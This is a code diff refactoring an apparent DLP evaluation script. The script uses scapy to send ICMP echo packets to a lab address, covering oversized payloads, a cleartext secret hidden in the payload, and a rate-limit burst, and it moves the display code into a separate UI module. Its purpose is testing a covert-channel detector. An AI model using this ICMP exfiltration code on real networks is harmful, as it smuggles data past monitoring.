@@ -1,162 +1,82 @@
-"""Visual ICMP Exfiltration Tool (Stream A / Demo & Evaluation Suite).
-
-Presents formatted terminal telemetry for live presentations and grading,
-illustrating naive L3/L4 covert channel attempts against the Gateway DLP.
-"""
-
 from __future__ import annotations
 
 import argparse
 import time
 
-from requests.packages import target
-from rich.console import Console
-from rich.panel import Panel
-from rich.progress import (
-    BarColumn,
-    MofNCompleteColumn,
-    Progress,
-    SpinnerColumn,
-    TextColumn,
-    TimeElapsedColumn,
-)
-from rich.table import Table
-from rich.traceback import install
 from scapy.layers.inet import ICMP, IP
 from scapy.packet import Raw
 from scapy.sendrecv import send
 
+from ui.display import (
+    BurstProgressTracker,
+    print_hint,
+    print_status,
+    print_success,
+    render_attack_banner,
+    render_payload_telemetry,
+)
+
 DEFAULT_TARGET = "172.21.0.10"
 WINDOWS_BENIGN_PAYLOAD = b"abcdefghijklmnopqrstuvwabcdefghi"
-
-console = Console(highlight=False)
-install(show_locals=False)
-
-
-def print_banner(target: str, mode: str, description: str, expected_alert: str) -> None:
-    """Renders a structured presentation header for the active scenario."""
-    grid = Table.grid(padding=(0, 2))
-    grid.add_column(style="bold cyan", justify="right")
-    grid.add_column()
-    grid.add_row("Scenario", f"[bold magenta]{mode.upper()}[/]")
-    grid.add_row("Objective", description)
-    grid.add_row("Target", f"[yellow]{target}[/] (Attacker Sink)")
-    grid.add_row("Expected", f"[red]{expected_alert}[/]")
-
-    console.print()
-    console.print(
-        Panel(
-            grid,
-            title="[bold yellow]DLP EVALUATION ATTACK SUITE[/] [dim]:: ICMP Covert Channel[/]",
-            border_style="cyan",
-            expand=False,
-        )
-    )
-    console.print()
-
-
-def print_payload_telemetry(payload: bytes, title: str = "Payload Inspection") -> None:
-    """Prints a neat hex/ASCII preview box of the outbound data."""
-    hex_preview = " ".join(f"{b:02x}" for b in payload[:24])
-    if len(payload) > 24:
-        hex_preview += " ..."
-    ascii_preview = "".join(chr(b) if 32 <= b < 127 else "." for b in payload[:48])
-
-    grid = Table.grid(padding=(0, 2))
-    grid.add_column(style="bold", justify="right")
-    grid.add_column()
-    grid.add_row("Total Size", f"[yellow]{len(payload)} bytes[/]")
-    grid.add_row("Hex Preview", f"[dim]{hex_preview}[/]")
-    grid.add_row("ASCII Decoded", f"[green]{ascii_preview}[/]")
-
-    console.print(
-        Panel(grid, title=f"[bold]{title}[/]", border_style="blue", expand=False)
-    )
-    console.print()
-
-
-def status(message: str) -> None:
-    console.print(f"  [bold cyan]➜[/] {message}")
-
-
-def success(message: str) -> None:
-    console.print(f"  [bold green]✔[/] {message}\n")
-
-
-def hint(message: str) -> None:
-    console.print(f"  [dim]➔ {message}[/]\n")
 
 
 def send_oversized(target: str, data: str) -> None:
     """Executes the oversized payload bulk dump attack."""
-    print_banner(
-        target,
-        mode="Oversized Frame Exfiltration",
-        description="Transmit bulky bulk payload exceeding OS threshold (>64B)",
-        expected_alert="icmp_oversized_payload (HIGH severity)",
+    render_attack_banner(
+        target=target,
+        scenario_mode="Oversized Frame Exfiltration",
+        scenario_description="Transmit bulky bulk payload exceeding OS threshold (>64B)",
+        expected_alert_identifier="icmp_oversized_payload (HIGH severity)",
     )
 
     payload = data.encode("utf-8")
-    print_payload_telemetry(payload, title="Forged Jumbo ICMP Payload")
+    render_payload_telemetry(payload, panel_title="Forged Jumbo ICMP Payload")
 
-    status("Injecting crafted frame onto network stack...")
+    print_status("Injecting crafted frame onto network stack...")
     pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
     send(pkt, verbose=False)
-    success(f"1 Frame dispatched to [yellow]{target}[/].")
-    hint("Observe 'covert-detector' logs for structural alert trigger.")
+    print_success(f"1 Frame dispatched to [yellow]{target}[/].")
+    print_hint("Observe 'covert-detector' logs for structural alert trigger.")
 
 
 def send_sensitive(target: str, data: str) -> None:
     """Executes the cleartext sensitive data exfiltration scenario."""
-    print_banner(
-        target,
-        mode="Sensitive Cleartext Exfiltration",
-        description="Hide unencrypted PCI-DSS/API secret inside ICMP Echo Request",
-        expected_alert="icmp_sensitive_data_* (CRITICAL/HIGH via L7 scanner)",
+    render_attack_banner(
+        target=target,
+        scenario_mode="Sensitive Cleartext Exfiltration",
+        scenario_description="Hide unencrypted PCI-DSS/API secret inside ICMP Echo Request",
+        expected_alert_identifier="icmp_sensitive_data_* (CRITICAL/HIGH via L7 scanner)",
     )
 
     payload = data.encode("utf-8")
-    print_payload_telemetry(payload, title="Exfiltrated Secret in Echo Payload")
+    render_payload_telemetry(payload, panel_title="Exfiltrated Secret in Echo Payload")
 
-    status("Injecting packet through gateway...")
+    print_status("Injecting packet through gateway...")
     pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
     send(pkt, verbose=False)
-    success("Packet dispatched with embedded secret.")
-    hint("Observe 'covert-detector' logs for L7 keyword/Luhn detection.")
+    print_success("Packet dispatched with embedded secret.")
+    print_hint("Observe 'covert-detector' logs for L7 keyword/Luhn detection.")
 
 
 def send_burst(target: str, count: int, delay: float) -> None:
     """Executes a high-frequency packet burst to test behavioral heuristics."""
-    print_banner(
-        target,
-        mode="High-Frequency Burst Flooding",
-        description=f"Rapidly dispatch {count} packets at {1 / delay:.0f} pkt/s (>4 pkt/s limit)",
-        expected_alert="icmp_high_frequency (Rate Limiting heuristic)",
+    render_attack_banner(
+        target=target,
+        scenario_mode="High-Frequency Burst Flooding",
+        scenario_description=f"Rapidly dispatch {count} packets at {1 / delay:.0f} pkt/s (>4 pkt/s limit)",
+        expected_alert_identifier="icmp_high_frequency (Rate Limiting heuristic)",
     )
 
-    with Progress(
-        SpinnerColumn(),
-        TextColumn("[bold cyan]{task.description}"),
-        BarColumn(bar_width=30),
-        MofNCompleteColumn(),
-        TimeElapsedColumn(),
-        console=console,
-    ) as progress:
-        task = progress.add_task("Burst Stream", total=count)
+    with BurstProgressTracker(total_packet_count=count, task_description="Burst Stream") as tracker:
         for seq in range(count):
             payload = WINDOWS_BENIGN_PAYLOAD
             pkt = IP(dst=target) / ICMP(type=8, seq=seq) / Raw(load=payload)
             send(pkt, verbose=False)
-            timestamp = time.strftime("%H:%M:%S")
-            progress.console.print(
-                f"  [cyan]{seq + 1:02d}/{count:02d}[/] [dim]{timestamp}[/] → "
-                f"Sent Echo [bold]Seq={seq:03d}[/] ({len(payload)}B)"
-            )
-            progress.advance(task)
+            tracker.step(packet_sequence_index=seq, payload_size_in_bytes=len(payload))
             time.sleep(delay)
 
-    success(f"Burst sequence concluded ({count} packets sent in {count * delay:.2f}s).")
-    hint(
+    print_success(f"Burst sequence concluded ({count} packets sent in {count * delay:.2f}s).")
+    print_hint(
         "Observe 'covert-detector' logs: packets 1-4 pass, packet 5+ triggers rate limit."
     )
 
